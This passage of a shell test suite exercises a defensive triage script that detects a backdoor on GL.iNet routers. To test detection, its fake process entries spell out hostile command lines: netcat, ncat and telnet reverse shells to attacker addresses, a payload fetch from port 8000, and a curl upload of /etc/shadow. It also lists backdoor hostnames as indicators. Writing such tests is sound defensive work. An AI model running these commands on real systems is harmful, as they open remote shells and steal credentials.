printf 'ELF 1.104.7-tiny.by.admon.1463\n' >"$D/m/usr/bin/tailscaled"
run "$D" "$OWK" --check >"$D/check.txt"; rc=$?
expect "where GoodCloud cannot be read the advice is given all the same" 'grep -q "Switch GoodCloud and AstroWarp off now" "$D/check.txt" && grep -q "could not be read" "$D/check.txt"'
expect "the netstat link alone: IOC, verdict ATTACKED by the installer, exit 1" '[ $rc = 1 ] && grep -q "IOC  *installer-trace  */usr/bin/netstat" "$D/check.txt" && grep -q "Verdict: ATTACKED - the malware.s installer" "$D/check.txt"'
expect "the updater's Tailscale in /usr/bin is waved through" 'grep -q "INFO  *updater-file  */usr/bin/tailscaled" "$D/check.txt"'
expect "an rc.local that is a link to a regular file is not called odd" '! grep -q "odd-file" "$D/check.txt"'
run "$D" "$OWK" --fix >"$D/fix.txt"; rc=$?
expect "--fix leaves the link, exits 1 and names no state file (issue 22)" '[ $rc = 1 ] && [ -L "$D/m/usr/bin/netstat" ] && grep -q "Nothing to remove for installer-trace" "$D/fix.txt" && ! grep -q "state file" "$D/fix.txt"'
umount "$D/m"
D=$(mkscen wg "$OWL"); U=$D/u
mkdir -p "$U/bin" "$U/etc/config"; printf '\033LuaQ loader\n' >"$U/bin/ulogd"; echo cfg >"$U/etc/config/wireguard_server"
touch -d '2025-12-19 21:07:07 UTC' "$U/bin/ulogd"; touch -d '2025-12-19 21:07:18 UTC' "$U/etc/config/wireguard_server"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "WireGuard server config written seconds after the loader is noted" 'grep -A1 "REVIEW  *backdoor-wg  */etc/config/wireguard_server" "$D/check.txt" | grep -q "written 11 s after"'
umount "$D/m"

echo "=== the address of the result page carries the result as a nine-character code"
# Every code is read back with the page's own reader (worker/src/result.html), so the
# script and the page cannot drift apart. Needs node; without it these are skipped.
readcode() { # the code in a file of script output, line $2 of those that carry one -> "v p k g n f rv"
	node -e 'const fs = require("fs"), h = fs.readFileSync(process.argv[1], "utf8"), src = h.slice(h.indexOf("const B32 = "), h.indexOf("function read() {"));
		const { decode } = new Function(src + "; return { decode };")(), c = decode(process.argv[2]);
		console.log(c ? `v=${c.v} p=${c.p} k=${c.k.join(".")} g=${c.g} n=${c.n} f=${c.f} rv=${c.rv}` + (c.dev && c.dev.model ? ` dev=${c.dev.model}/${c.dev.ver.join(".")}/${c.dev.test ? "test" : "release"}` : "") : "invalid");' \
		"$(dirname "$T")/worker/src/result.html" "$(grep -o "$3/#[0-9A-Z-]*" "$1" | sed -n "${2}p" | sed 's/.*#//')"
}
D=$(mkscen link "$OWL")
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
grep -B1 'csa.gl-i.net/#' "$D/check.txt"
expect "the address is short: the host, a # and nine characters without I, L, O or U" 'grep -qE "^   >>> https://csa\.gl-i\.net/#[0-9A-HJKMNP-TV-Z]{9}$" "$D/check.txt"'
mkdir -p "$D/m/tmp" "$D/m/etc/config"; mkfifo "$D/m/tmp/f"; printf '#!/bin/sh\nmy-own-thing\n' >"$D/m/etc/rc.local"
printf "config cloud\n\toption enable '1'\n" >"$D/m/etc/config/gl-cloud"; printf 'x http://up.adguardns.org/\n' >"$D/m/etc/config/other"
run "$D" "$OWL" --check >"$D/check2.txt"
GL_TRIAGE_RESULT_URL=https://example.org/x/ run "$D" "$OWL" --fix >"$D/fix.txt"
if command -v node >/dev/null 2>&1; then
	V=$(sed -n 's/^VERSION=//p' "$T")
	expect "clean: this version, a router, no findings, GoodCloud not known" '[ "$(readcode "$D/check.txt" 1 csa.gl-i.net)" = "v=$V p=r k= g=x n=0 f=0 rv=0" ]'
	readcode "$D/check2.txt" 1 csa.gl-i.net
	expect "pipe, changed rc.local and a backdoor server: their kinds, GoodCloud on" '[ "$(readcode "$D/check2.txt" 1 csa.gl-i.net)" = "v=$V p=r k=pp.bh.pe g=1 n=0 f=0 rv=0" ]'
	expect "after --fix the address still names what was found, and says the fix is incomplete" '[ "$(readcode "$D/fix.txt" 1 example.org/x)" = "v=$V p=r k=pp.bh.pe g=1 n=0 f=3 rv=0" ]'
else
	echo "  SKIP: reading the codes back needs node"
fi
expect "the result with its address comes after the GoodCloud advice, the address right under the verdict" 'grep -A8 "Verdict:" "$D/check.txt" | grep -q "csa.gl-i.net/#" && [ "$(grep -n "^== GoodCloud" "$D/check.txt" | head -n 1 | cut -d: -f1)" -lt "$(grep -n "^== Result" "$D/check.txt" | head -n 1 | cut -d: -f1)" ] && [ "$(grep -c "^== GoodCloud" "$D/check.txt")" = 1 ]'
expect "on a device with traces the next steps follow the result" '[ "$(grep -n "^== Result" "$D/check2.txt" | head -n 1 | cut -d: -f1)" -lt "$(grep -n "^== Next steps" "$D/check2.txt" | head -n 1 | cut -d: -f1)" ]'
expect "with --fix the address is given once, under the verdict after the clean-up" '[ "$(grep -c "https://example.org/x/#" "$D/fix.txt")" = 1 ] && grep -A25 "^== Result after remediation" "$D/fix.txt" | grep -q "https://example.org/x/#" && [ "$(grep -c "^== GoodCloud" "$D/fix.txt")" = 1 ]'
# model and firmware: a second part of five characters, where both are known
mkdir -p "$D/m/tmp/sysinfo" "$D/m/etc"; echo 'GL.iNet GL-MT6000' >"$D/m/tmp/sysinfo/model"; echo 4.9.1 >"$D/m/etc/glversion"; echo release2 >"$D/m/etc/version.type"
run "$D" "$OWL" --check >"$D/check3.txt"
grep 'csa.gl-i.net/#' "$D/check3.txt"
expect "with model and firmware known the address has a second part, and says so" 'grep -qE "^   >>> https://csa\.gl-i\.net/#[0-9A-HJKMNP-TV-Z]{9}-[0-9A-HJKMNP-TV-Z]{5}$" "$D/check3.txt" && grep -q "the model and its firmware version" "$D/check3.txt"'
echo 4.11.0 >"$D/m/etc/glversion"; echo beta5 >"$D/m/etc/version.type"; echo mt3000 >"$D/m/tmp/sysinfo/model"
run "$D" "$OWL" --check >"$D/check4.txt"
echo 'Some Other Board' >"$D/m/tmp/sysinfo/model"
run "$D" "$OWL" --check >"$D/check5.txt"
echo mt6000 >"$D/m/tmp/sysinfo/model"; echo 3.216 >"$D/m/etc/glversion"
run "$D" "$OWL" --check >"$D/check6.txt"
if command -v node >/dev/null 2>&1; then
	expect "the second part reads back as the model and the version" 'readcode "$D/check3.txt" 1 csa.gl-i.net | grep -q " dev=mt6000/4.9.1/release$"'
	expect "a beta build is marked as a test build" 'readcode "$D/check4.txt" 1 csa.gl-i.net | grep -q " dev=mt3000/4.11.0/test$"'
fi
expect "an unknown model or a version that does not fit: the short address, as before" 'grep -qE "csa\.gl-i\.net/#[0-9A-HJKMNP-TV-Z]{9}$" "$D/check5.txt" && grep -qE "csa\.gl-i\.net/#[0-9A-HJKMNP-TV-Z]{9}$" "$D/check6.txt" && ! grep -q "the model and its firmware version" "$D/check5.txt"'
expect "nothing of a path or a name is in the address" '! grep "csa.gl-i.net/#" "$D/check2.txt" | grep -qi "rc.local\|adguard\|tmp"'
umount "$D/m"

echo "=== a copy of this script on the device is not a trace"
D=$(mkscen selfcopy "$OWL")
mnt "$D" "$OWL"
for d in etc/config etc/init.d etc/hotplug.d/iface etc/profile.d root; do mkdir -p "$D/m/$d"; cp "$T" "$D/m/$d/gl-helper-triage.sh"; done
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "copies in /etc/config and in autostart places: REVIEW script-copy, exit 0, clean verdict" '[ $rc = 0 ] && grep -q "REVIEW  *script-copy  */etc/config/gl-helper-triage.sh" "$D/check.txt" && grep -q "REVIEW  *script-copy  */etc/init.d/gl-helper-triage.sh" "$D/check.txt" && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
printf '#!/bin/sh\nwget http://cdn.adguardns.com/x\n' >"$D/m/etc/config/other.sh"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "another file that names a server of the backdoor is still IOC" '[ $rc = 1 ] && grep -q "IOC  *backdoor-host  */etc/config/other.sh" "$D/check.txt"'
umount "$D/m"

echo "=== what the base image's busybox loads must be the base image's (issue 8)"
OWB=$BASE/openwrt-rom-libs
cp -a "$OWL" "$OWB"; mkdir -p "$OWB/lib"
printf 'ELF junk /lib/ld-musl-test.so.1 more libc.so and libgcc_s.so.1 end\n' >"$OWB/bin/busybox"
echo 'the real libc' >"$OWB/lib/libc.so"; echo 'the real libgcc' >"$OWB/lib/libgcc_s.so.1"; ln -s libc.so "$OWB/lib/ld-musl-test.so.1"
D=$(mkscen libs "$OWB"); U=$D/u
mnt "$D" "$OWB"
run "$D" "$OWB" --check >"$D/check.txt"; rc=$?
expect "untouched libraries: no finding, no warning" '[ $rc = 0 ] && ! grep -q "changed-lib" "$D/check.txt" && ! grep -q "would load files" "$D/check.txt"'
umount "$D/m"
mkdir -p "$U/lib"; echo 'another libc' >"$U/lib/libc.so"
mnt "$D" "$OWB"
run "$D" "$OWB" --check >"$D/check.txt"
grep -E -A1 'changed-lib|would load' "$D/check.txt"
expect "a libc in the overlay is REVIEW changed-lib, and the tools are not trusted" 'grep -q "REVIEW  *changed-lib  */lib/libc.so" "$D/check.txt" && grep -q "Trusted tools  *no" "$D/check.txt" && grep -A1 "would load files" "$D/check.txt" | grep -q "(/lib/libc.so)"'
umount "$D/m"
rm "$U/lib/libc.so"; cp "$OWB/lib/libc.so" "$U/lib/libc.so"; mkdir -p "$U/etc"; echo /tmp/x >"$U/etc/ld-musl-test.path"
mnt "$D" "$OWB"
run "$D" "$OWB" --check >"$D/check.txt"
expect "an identical copy is fine; a library path file for the loader is REVIEW changed-lib" '! grep -q "changed-lib  */lib/libc.so" "$D/check.txt" && grep -q "REVIEW  *changed-lib  */etc/ld-musl-test.path" "$D/check.txt"'
umount "$D/m"
rm "$U/etc/ld-musl-test.path"; rm "$U/lib/libc.so"; rm -f "$U/lib/ld-musl-test.so.1"; ln -s /tmp/evil.so "$U/lib/ld-musl-test.so.1"
mnt "$D" "$OWB"
run "$D" "$OWB" --check >"$D/check.txt"
expect "a loader link that points elsewhere is REVIEW changed-lib" 'grep -q "REVIEW  *changed-lib  */lib/ld-musl-test.so.1" "$D/check.txt"'
umount "$D/m"

echo "=== the report's note (--note)"
# The report is only built on a live device (--root /), so the script runs as / of a
# chroot that holds nothing but a static busybox: its ash, as on a router. Nothing is
# sent: stdin is not a terminal, and the address points nowhere.
BB=$(command -v busybox)
if [ -n "$BB" ] && file -L "$BB" | grep -q 'statically linked'; then
	L=$BASE/live; mkdir -p "$L/bin" "$L/tmp" "$L/dev"; cp "$BB" "$L/bin/busybox"; cp "$T" "$L/t.sh"; : >"$L/dev/null"
	mount --bind /dev/null "$L/dev/null"; chroot "$L" /bin/busybox --install -s /bin
	# TMPDIR of the caller would name a directory that the chroot does not have
	live() { TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ chroot "$L" /bin/sh /t.sh --no-device-id "$@" </dev/null 2>&1; }
	live --show-report --note 'fleet-a 2026-11-22 after clean-up (repeat)' >"$L/show.txt"
	expect "the note, schema 10 and whether the firmware cleans up are in the report" 'grep -q "^   \"schema\": 10,$" "$L/show.txt" && grep -q "^   \"vendor_cleanup\": \"unknown\",$" "$L/show.txt" && grep -q "^   \"note\": \"fleet-a 2026-11-22 after clean-up (repeat)\",$" "$L/show.txt"'
	live --show-report --note "$(printf 'a;b"c\\d$e<\303\251>f\tg')" >"$L/show.txt"
	expect "characters jstr does not allow are dropped from the note" 'grep -q "\"note\": \"abcdefg\",$" "$L/show.txt"'
	X=$(head -c 130 /dev/zero | tr '\0' x); live --show-report --note "$X" >"$L/show.txt"
	expect "the note is cut at 120 characters" 'grep -q "\"note\": \"${X%??????????}\",$" "$L/show.txt"'
	live --show-report >"$L/show.txt"
	expect "without --note the note is empty" 'grep -q "\"note\": \"\",$" "$L/show.txt"'
	# the state file's first call: empty where /proc/mounts is missing or the mount is not
	# noatime, the access time where it is. /etc of the chroot is mounted noatime for that.
	mkdir -p "$L/etc"; : >"$L/etc/mp_ip_mapping_info"
	expect "without /proc/mounts the first call is empty" 'live --show-report | grep -q "\"state_file_first\": \"\",$"'
	mount --bind "$L/etc" "$L/etc"; mount -o remount,bind,noatime "$L/etc" 2>/dev/null
	mkdir -p "$L/proc"; printf '/dev/root / ext4 rw,relatime 0 0\n' >"$L/proc/mounts"
	expect "on a mount that is not noatime the first call is empty" 'live --show-report | grep -q "\"state_file_first\": \"\",$"'
	# The access time is set only now: on a relatime filesystem the reads above have moved
	# it. The mount must really be noatime, or the script's own read moves it again; a user
	# namespace on a relatime filesystem refuses that remount, and then this is skipped.
	F=$L/etc/mp_ip_mapping_info
	touch -a -d '2026-03-02 08:14:55 UTC' "$F"; cat "$F" >/dev/null
	if awk -v m="$L/etc" '$2 == m && ("," $4 ",") ~ /,noatime,/ { f = 1 } END { exit !f }' /proc/self/mounts &&
		[ "$(stat -c %X "$F")" = "$(date -u -d '2026-03-02 08:14:55 UTC' +%s)" ]; then
		printf '/dev/root / ext4 rw,relatime 0 0\n/dev/sda1 /etc ext4 rw,noatime 0 0\n' >"$L/proc/mounts"
		expect "on a noatime mount the report carries the first call" 'live --show-report | grep -q "\"state_file_first\": \"2026-03-02 08:14:55 UTC\",$"'
	else
		echo "  SKIP: on a noatime mount the report carries the first call (no noatime mount here: $(awk -v m="$L/etc" '$2 == m { print $4 }' /proc/self/mounts))"
	fi
	rm "$L/proc/mounts" "$F"; umount "$L/etc"
	live --note 'fleet-a, repeat' >"$L/ask.txt"
	expect "the summary before sending prints the note word for word" 'grep -A1 "And your note, as it will be sent:" "$L/ask.txt" | grep -qx "        fleet-a, repeat" && grep -q "Not sent" "$L/ask.txt"'
	live >"$L/ask.txt"
	expect "without a note the summary does not mention one" '! grep -q "your note" "$L/ask.txt" && grep -q "Not sent" "$L/ask.txt"'
	live --note >"$L/err.txt"; rc=$?
	expect "--note without a text is an error, exit 4" '[ $rc = 4 ] && grep -q "ERROR: --note needs a text" "$L/err.txt"'
	# The second stage: a process ujaild that runs from a deleted /tmp/ujaild, in a /proc
	# made of plain files. No test can hold a program with a known hash, so this checks that
	# another hash leaves the finding as it is.
	mkdir -p "$L/proc/1" "$L/proc/4242"; printf 'init\0' >"$L/proc/1/cmdline"
	echo ujaild >"$L/proc/4242/comm"; printf '/usr/sbin/ujaild\0' >"$L/proc/4242/cmdline"
	echo 'another build' >"$L/tmp/ujaild (deleted)"; ln -s '/tmp/ujaild (deleted)' "$L/proc/4242/exe"
	live --no-report >"$L/check.txt"; rc=$?
	expect "ujaild with another hash is still IOC backdoor-proc, not called the known one" '[ $rc = 1 ] && grep -A1 "IOC  *backdoor-proc  *4242" "$L/check.txt" | grep -q "older backdoor: comm=ujaild" && ! grep -q "known second stage" "$L/check.txt"'
	# Processes that only name a server, the shell's address or a path of the malware are
	# not the malware (issues 7 and 20): REVIEW, or INFO for a block, and never stopped.
	# Only --check runs here: these numbers are not processes of the chroot.
	fp() { mkdir -p "$L/proc/$1"; echo "$2" >"$L/proc/$1/comm"; printf "$3" >"$L/proc/$1/cmdline"; ln -s /bin/busybox "$L/proc/$1/exe"; }
	fp 5001 sh 'sh\0-c\0sleep 60; : ping gl-inet.top\0'
	fp 5002 tcpdump 'tcpdump\0-ni\0any\0host\000170.39.226.219\0'
	fp 5003 tail 'tail\0-f\0/etc/config/.gl/install.log\0'
	fp 5004 iptables 'iptables\0-I\0OUTPUT\0-d\00065.20.71.131\0-j\0DROP\0'
	fp 5005 wget 'wget\0-qO-\0http://65.20.71.131:8000/ni.sh\0'
	fp 5006 nc 'nc\000170.39.226.219\0004444\0'
	fp 5007 cat 'cat\0/tmp/f\0'
	fp 5008 sh '/bin/sh\0/etc/glinet/.cache/watch.sh\0'
	fp 5009 sh 'sh\0-c\0rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 4444 >/tmp/f\0'
	live --no-report >"$L/procs.txt"
	expect "a process that only names a server, the address or a path is REVIEW" 'grep -A1 "REVIEW  *process  *5001" "$L/procs.txt" | grep -q "names a server of the malware, but does not fetch" && grep -A1 "REVIEW  *process  *5002" "$L/procs.txt" | grep -q "not made like it" && grep -A1 "REVIEW  *process  *5003" "$L/procs.txt" | grep -q "names a path of the malware, but does not run it" && ! grep -qE "IOC  *process  *500[123]" "$L/procs.txt"'
	expect "a process that blocks a server is INFO" 'grep -q "INFO  *process  *5004" "$L/procs.txt" && ! grep -qE "(IOC|REVIEW)  *process  *5004" "$L/procs.txt"'
	expect "a fetch, nc, cat of the pipe, the malware's script and the reported shell line are IOC" 'grep -A1 "IOC  *process  *5005" "$L/procs.txt" | grep -q "fetches from a server" && grep -A1 "IOC  *process  *5006" "$L/procs.txt" | grep -q "remote shell reported" && grep -q "IOC  *process  *5007" "$L/procs.txt" && grep -q "IOC  *process  *5008" "$L/procs.txt" && grep -A1 "IOC  *process  *5009" "$L/procs.txt" | grep -q "remote shell reported"'
	rm -r "$L"/proc/500?
	# variants of the shell, a script started with ".", and a name that tries to hide a process
	fp 5011 ncat 'ncat\000170.39.226.219\0004444\0-e\0/bin/sh\0'
	fp 5012 sh 'sh\0-c\0telnet 170.39.226.219 4444 | /bin/sh | telnet 170.39.226.219 4445\0'
	fp 5013 sh 'sh\0-c\0. /etc/config/.gl/boot.sh\0'
	fp 5014 nc 'nc\000170.39.226.219\0004444\0-e\0/bin/sh\0--\0gl-helper-triage\0'
	fp 5015 sh 'sh\0/root/gl-helper-triage.sh\0--check\0'
	live --no-report >"$L/procs2.txt"
	expect "ncat, telnet, a sourced script of the malware and a hiding name are IOC; this script itself is not" '(for n in 5011 5012 5013 5014; do grep -q "IOC  *process  *$n" "$L/procs2.txt" || exit 1; done) && ! grep -q "process  *5015" "$L/procs2.txt"'
	rm -r "$L"/proc/501?
	# a respawn loop, more tools, a program from /tmp, a probe, a block taken away, and this
	# script's name on a program that is not this script (review of 2.53)
	mkdir -p "$L/tmp/self"; cp "$T" "$L/tmp/self/gl-helper-triage.sh"; echo payload >"$L/tmp/gl-helper-triage.sh"; echo payload >"$L/tmp/gb"
	fp 5021 sh 'sh\0-c\0while :; do /etc/glinet/.cache/gl-helper; sleep 30; done\0'
	fp 5022 dbclient 'dbclient\0-N\0-R\0002222:127.0.0.1:22\0u@66.245.219.252\0'
	fp 5023 gb '/tmp/gb\00065.20.71.131\0008000\0'; ln -sf /tmp/gb "$L/proc/5023/exe"
	fp 5024 gl-helper-triag '/tmp/gl-helper-triage.sh\00065.20.71.131\0'; ln -sf /tmp/gl-helper-triage.sh "$L/proc/5024/exe"
	fp 5025 nc 'nc\0-z\0-w\0003\00065.20.71.131\0008000\0'
	fp 5026 iptables 'iptables\0-D\0OUTPUT\0-d\00065.20.71.131\0-j\0DROP\0'
	fp 5027 sh '/bin/sh\0-c\0sh /tmp/self/gl-helper-triage.sh --archive -o /mnt/usb/gl-helper\0'
	live --no-report >"$L/procs3.txt"
	expect "a loop around the malware, dbclient, a program from /tmp and one named like this script are IOC" '(for n in 5021 5022 5023 5024; do grep -q "IOC  *process  *$n" "$L/procs3.txt" || exit 1; done)'
	expect "a probe and a block taken away are REVIEW; this script from cron is skipped" 'grep -q "REVIEW  *process  *5025" "$L/procs3.txt" && grep -q "REVIEW  *process  *5026" "$L/procs3.txt" && ! grep -q "INFO  *process  *5026" "$L/procs3.txt" && ! grep -q "process  *5027" "$L/procs3.txt"'
	rm -r "$L"/proc/502? "$L/tmp/self"; rm -f "$L/tmp/gl-helper-triage.sh" "$L/tmp/gb"
	# pidof in $( ), an upload into /dev/null, a check of a block, timeout, a newline in sh -c
	# (third review of 2.53)
	fp 5031 sh 'sh\0-c\0PID=$(pidof gl-helper); [ -n "$PID" ] && logger running\0'
	fp 5032 curl 'curl\0-s\0-o\0/dev/null\0-d\0@/etc/shadow\0http://65.20.71.131:8000/up\0'
	fp 5033 sh 'sh\0-c\0wget -qO- -T 5 http://65.20.71.131:8000/ >/dev/null 2>&1 && logger -t csa down\0'
	fp 5034 sh 'sh\0-c\0timeout -s KILL 60 /etc/config/.gl/gl-helper\0'
	fp 5035 sh 'sh\0-c\0sleep 5\n/etc/glinet/.cache/gl-helper\0'
	live --no-report >"$L/procs4.txt"
	expect "pidof in \$( ) and a check of a block are REVIEW; an upload, timeout and a second line are IOC" 'grep -q "REVIEW  *process  *5031" "$L/procs4.txt" && grep -q "REVIEW  *process  *5033" "$L/procs4.txt" && ! grep -qE "IOC  *process  *503[13]" "$L/procs4.txt" && (for n in 5032 5034 5035; do grep -q "IOC  *process  *$n" "$L/procs4.txt" || exit 1; done)'
	rm -r "$L"/proc/503?
	# The report keeps the owner's lines and names, and says so in bold before it asks
	mkdir -p "$L/etc"; printf '/etc/glinet/.cache/gl-helper &\niptables -t nat -A PREROUTING -p tcp --dport 2222 -j DNAT --to 192.168.8.50:22\niptables -I FORWARD -s 192.168.8.60 -d 65.20.71.131 -j DROP\niptables -t nat -A PREROUTING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1\nexit 0\n' >"$L/etc/rc.local"
	{ printf 'root:x:0:0:root:/root:/bin/ash\njsmith-admin:x:0:0::/root:/bin/ash\n'; for n in 1 2 3 4 5 6 7 8; do printf 'zz%s:x:0:0::/root:/bin/ash\n' "$n"; done; } >"$L/etc/passwd"
	live >"$L/ask2.txt"
	expect "the summary counts a line with the owner's and the attacker's address, not 127.0.0.1" 'grep -q "2 of them hold IP addresses that are not the attacker" "$L/ask2.txt"'
	expect "the summary names the accounts, and how many more the report holds" 'grep -q "Also the name of each account the firmware does not have: jsmith-admin zz1 .* zz7 and 1 more" "$L/ask2.txt" && grep -q "What stands in the" "$L/ask2.txt" && ! grep -q "Not sent: host name, keys, passwords" "$L/ask2.txt"'
	rm "$L/etc/rc.local" "$L/etc/passwd"
	# Tools that are not busybox applets (issue 8): run only when they are the base image's.
	# The chroot gets a base image with the same busybox and an iptables-save that prints
	# the rule the attack leaves; first the same file in the system, then a changed one.
	mkdir -p "$L/rom/bin" "$L/rom/usr/sbin" "$L/usr/sbin"; cp "$BB" "$L/rom/bin/busybox"
	printf '#!/bin/sh\necho "*nat"\necho "-A SDWAN_IP_MAPPING -d 127.0.0.1/32 -j DNAT --to-destination 127.0.0.1"\necho COMMIT\n' >"$L/rom/usr/sbin/iptables-save"
	chmod +x "$L/rom/usr/sbin/iptables-save"; cp -p "$L/rom/usr/sbin/iptables-save" "$L/usr/sbin/iptables-save"
	livep() { PATH=/usr/sbin:/bin TMPDIR=/tmp GL_TRIAGE_REPORT_URL=http://127.0.0.1:9/ chroot "$L" /bin/sh /t.sh --no-device-id "$@" </dev/null 2>&1; }
	livep --no-report >"$L/tool.txt"
	expect "a tool that is the base image's is run: its rule is found" 'grep -q "Trusted tools  *yes (/rom/bin/busybox" "$L/tool.txt" && grep -q "IOC  *fw-rule" "$L/tool.txt" && ! grep -q "tool-skipped" "$L/tool.txt"'
	echo 'echo changed >/dev/null' >>"$L/usr/sbin/iptables-save"
	livep --no-report >"$L/tool.txt"
	grep -E -A1 'tool-skipped' "$L/tool.txt"
	expect "a changed tool is not run and is listed as skipped" 'grep -q "INFO  *tool-skipped  */usr/sbin/iptables-save" "$L/tool.txt" && ! grep -q "IOC  *fw-rule" "$L/tool.txt"'
	rm -r "$L/rom" "$L/usr"
	umount "$L/dev/null"
else
	echo "  SKIP: needs a statically linked busybox"
fi

echo "=== firmware that cleans up by itself (GL.iNet's gl-sdk4-system-check, router firmware 4.9.3)"
D=$(mkscen vclean "$OWL"); U=$D/u
mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: git-2026.325.35972-e271f36\n\nPackage: gl-sdk4-system-check\nVersion: 1\n\n' >"$U/usr/lib/opkg/status"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "the cleanup package is named, and the clean result says what it is worth" 'grep -q "INFO  *vendor-cleanup" "$D/check.txt" && grep -q "cleans up by itself" "$D/check.txt" && grep -q "Not proof that nothing happened" "$D/check.txt" && grep -q "no gl-helper indicators found" "$D/check.txt"'
expect "the code carries it, so the page can say the same" 'readcode "$D/check.txt" 1 csa.gl-i.net | grep -q " k=vc "'
umount "$D/m"
D=$(mkscen noclean "$OWL"); U=$D/u
mkdir -p "$U/usr/lib/opkg"; printf 'Package: gl-sdk4-cloud\nVersion: git-2026.146.23211-bea5eca\n\n' >"$U/usr/lib/opkg/status"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "without that package nothing is said about a cleanup, the limit of a clean result still is" '! grep -q "vendor-cleanup\|cleans up by itself" "$D/check.txt" && grep -q "Not proof that nothing happened" "$D/check.txt" && ! readcode "$D/check.txt" 1 csa.gl-i.net | grep -q "vc"'
umount "$D/m"

echo "=== the state file on firmware with the fix (issue 19)"
D=$(mkscen fresh "$OWL"); U=$D/u
mkdir -p "$U/usr/lib/opkg" "$U/etc"; printf 'Package: gl-sdk4-system-check\nVersion: 1\n\n' >"$U/usr/lib/opkg/status"
echo '2026-11-22 12:36:07' >"$U/etc/version.date"
# as on a real device: written at the first start, before the clock is set
echo '{}' >"$U/etc/board.json"; touch -d '1970-01-01 00:00:11 UTC' "$U/etc/board.json"
: >"$U/etc/mp_ip_mapping_info"; touch -d '2026-11-22 17:26:53 UTC' "$U/etc/mp_ip_mapping_info"
# the SD-WAN module's other state files, written in the same seconds at its start
echo '{}' >"$U/etc/mp_connection_info"; touch -d '2026-11-22 17:26:52 UTC' "$U/etc/mp_connection_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "an empty state file written after the fixed firmware was built is REVIEW, not a trace" '[ $rc = 0 ] && grep -q "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" && grep -q "written after this firmware was built" "$D/check.txt" && ! grep -q "IOC  *cloud-command" "$D/check.txt" && grep -q "no gl-helper indicators found" "$D/check.txt"'
umount "$D/m"
touch -d '2026-11-21 02:50:11 UTC' "$U/etc/mp_ip_mapping_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "one from before the build day stays a trace, whatever the date of board.json" '[ $rc = 1 ] && grep -q "IOC  *cloud-command  */etc/mp_ip_mapping_info" "$D/check.txt"'
umount "$D/m"
# after the build day, but on its own: the attack on the old firmware before the upgrade (review of 2.54)
touch -d '2026-11-22 22:10:00 UTC' "$U/etc/mp_ip_mapping_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "one written after the build day but not with the module's other files stays a trace" '[ $rc = 1 ] && grep -q "IOC  *cloud-command  */etc/mp_ip_mapping_info" "$D/check.txt"'
umount "$D/m"

echo "=== binary files hold NUL bytes (issue 24): names behind them must still be found"
# Compiled Lua keeps each name behind a length of four bytes, three of them NUL. A real
# program holds its loader and libraries between NUL bytes as well.
D=$(mkscen nul "$OWL"); U=$D/u
mkdir -p "$U/usr/lib"
{ printf '\033LuaQ\000\001\004\004\004\010\000'; head -c 1500 /dev/zero; printf '\022\000\000\000get_mac_form_proc\000\015\000\000\000domain_table\000'; } >"$U/usr/lib/hidden-loader"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "the loader under another name is found although NUL bytes stand before its names" 'grep -q "IOC  *backdoor-file  */usr/lib/hidden-loader" "$D/check.txt"'
umount "$D/m"
OWN=$BASE/openwrt-rom-nul
cp -a "$OWL" "$OWN"; mkdir -p "$OWN/lib"
{ printf '\177ELF\002\001\001\000\000\000\000\000\000\000\000\000'; head -c 600 /dev/zero; printf '/lib/ld-musl-test.so.1\000'; head -c 300 /dev/zero; printf '\000libgcc_s.so.1\000libc.so\000'; head -c 200 /dev/zero; } >"$OWN/bin/busybox"
echo 'the real libc' >"$OWN/lib/libc.so"; echo 'the real libgcc' >"$OWN/lib/libgcc_s.so.1"; ln -sf libc.so "$OWN/lib/ld-musl-test.so.1"
D=$(mkscen nullib "$OWN"); U=$D/u
mkdir -p "$U/lib"; echo 'another libc' >"$U/lib/libc.so"
mnt "$D" "$OWN"
run "$D" "$OWN" --check >"$D/check.txt"
expect "a changed libc is found although the program names it between NUL bytes" 'grep -q "REVIEW  *changed-lib  */lib/libc.so" "$D/check.txt"'
umount "$D/m"

echo "=== every run says how old this version is and how to get the current one"
D=$(mkscen age "$OWL"); mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "a fresh version: its release time and the command to update" 'grep -q "^   Released  *20[0-9-]* [0-9:]* UTC" "$D/check.txt" && grep -q "^   Update  *sh .* --update" "$D/check.txt" && ! grep -q "newer version is likely" "$D/check.txt"'
TNOW=$T; T=$BASE/old-version.sh; sed "s|^RELEASED=.*|RELEASED='2026-11-01 08:00 UTC'|" "$TNOW" >"$T"
run "$D" "$OWL" --check >"$D/check.txt"
expect "an old version: its age in days, and that a newer one is likely" 'grep -q "^   Released  *2026-11-01 08:00 UTC, .*[0-9][0-9]* days ago" "$D/check.txt" && grep -q "newer version is likely.*--update" "$D/check.txt"'
T=$TNOW
umount "$D/m"

echo "=== --update: only a newer version with a good signature replaces the script"
SIGNIFY=$(command -v signify-openbsd 2>/dev/null || command -v signify 2>/dev/null || true)
if [ -n "$SIGNIFY" ] && command -v python3 >/dev/null 2>&1; then
	W=$BASE/update; mkdir -p "$W/www" "$W/bin" "$W/dev"
	for k in k1 k2 kx; do "$SIGNIFY" -G -n -p "$W/$k.pub" -s "$W/$k.sec"; done
	keys="$(sed -n 2p "$W/k1.pub") $(sed -n 2p "$W/k2.pub")"
	# usign as the firmware has it takes the options signify takes
